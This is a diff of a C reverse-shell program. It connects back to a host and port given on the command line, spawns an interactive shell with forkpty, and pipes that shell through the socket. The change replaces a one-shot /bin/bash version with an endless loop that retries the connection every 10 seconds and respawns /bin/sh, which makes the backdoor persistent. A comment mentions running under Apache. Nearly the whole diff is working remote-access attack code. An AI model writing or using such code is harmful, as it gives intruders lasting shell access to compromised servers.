@@ -93,37 +93,28 @@ int main(int argc, char* argv[])
 	
 	if(argc != 3)
 		return printf("%s <host> <port>\r\n", argv[0]);
-		
-	//fork child process, no hung
-	pid = fork();
-	if(pid == -1)
-		return printf("fork: %s\r\n", strerror(errno));
-	if(pid > 0)
-		return printf("child process %d\r\n", pid);
-
-	//connection back with tcp
-	if((sockfd = connectback(host, port)) == -1)
-		return 0;
-	
-	//setup handler for SIGCHLD
-	//SIGCHLD就是内核在任何一个进程终止时发送给父进程的一个信号。
-	signal(SIGCHLD, sig_child);
-	
-	//fork and open pty
-	pid = forkpty(&master, ptsname, NULL, NULL);
-	
-	//child open bash shell
-	if(pid == 0)
-		execlp("/bin/bash", "-i", NULL);
-
-	//dup2 stdin/stdout/stderr to sockfd, it's will hung executed by apache if not do this step
-	dup2(sockfd, 0);
-	dup2(sockfd, 1);
-	dup2(sockfd, 2);
-	//parent swap data
-	printf("[%s][PID=%d]\r\n", ptsname, (int) pid);
-	swap(sockfd, master);
-
+	while(1){	
+		sockfd = connectback(host, port);
+		while(sockfd < 0){
+			sleep(10);
+			sockfd = connectback(host, port);
+		}
+		pid = fork();
+		if(pid > 0) {
+			printf("PARENT process waits until the shell process is finished\n");
+			wait(NULL);
+		}
+		if(pid == 0) {
+			signal(SIGCHLD, sig_child);
+			pid = forkpty(&master, ptsname, NULL, NULL);
+			if(pid == 0) {
+				execlp("/bin/sh", "-i", NULL);
+			}
+			dup2(sockfd, 0);
+			dup2(sockfd, 1);
+			dup2(sockfd, 2);
+			swap(sockfd, master);
+		}
+	}
 	return 0;
 }
-
